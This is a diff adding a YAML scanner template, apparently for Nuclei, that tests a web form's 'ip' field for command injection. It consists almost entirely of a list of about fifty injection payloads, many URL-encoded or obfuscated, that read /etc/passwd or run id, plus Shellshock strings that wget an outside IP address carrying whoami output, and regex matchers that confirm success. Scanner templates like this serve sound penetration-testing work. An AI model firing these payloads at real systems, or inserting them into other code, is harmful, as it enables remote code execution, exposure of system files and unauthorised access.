@@ -1,0 +1,96 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - "|cat /etc/passwd"
+        - "%5Cid"
+        - "cat$u /etc$u/passwd"
+        - "%29%7Cid%7C"
+        - "cat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "%26id"
+        - "%2F%2Fbin%24u%2Fbash%24u%3B"
+        - "%22cat%20/etc/passwd%3B"
+        - "&cat%20/etc/passwd"
+        - "%29%20%60id%60"
+        - "cat `xxd -r -p <<<(echo 2f6574632f706173737764)`"
+        - "id"
+        - "%5Cnid%60"
+        - "%24%28cat%20%2Fetc%2Fpasswd%29"
+        - "||{cat,/etc/passwd}"
+        - "%27id"
+        - "%26id"
+        - "cat /etc/passwd"
+        - "cat%24IFS%2Fetc%2Fpasswd"
+        - "%22id%22"
+        - "%27id%27"
+        - "%60id%60"
+        - "cat%24u%2B%2Fetc%24u%2Fpasswd"
+        - "%7Ccat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=22?user=\\`whoami\\`\""
+        - "%60id%60"
+        - "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=22?user=\\`whoami\\`\""
+        - "%60cat%24u%20%2Fetc%24u%2Fpasswd%24u%60"
+        - "() { :;}; /bin/bash -c \"sleep 6 && echo vulnerable 6\""
+        - "&&cat%24u%20/etc$u/passwd"
+        - ";system('id')"
+        - "%7Ccat%24u%20%2Fetc%24u%2Fpasswd"
+        - "cat$u+/etc$u/passwd$u"
+        - "& ping 127.0.0.1 &"
+        - "||cat+/etc/passwd+#"
+        - "%5Cu-id%7C"
+        - "||cat%20/etc/passwd"
+        - "%26id"
+        - "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+"
+        - "&& id"
+        - ";netstat -a;"
+        - "& id"
+        - "%26id"
+        - "||cat%20/etc/passwd"
+        - "%27%2Fusr%2Fbin%2Fid"
+        - "a)|id"
+        - ";id"
+        - "%26%20id%20"
+        - "${IFS}id"
+        - "%7Ccat%24u%20%2Fetc%24u%2Fpasswd"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
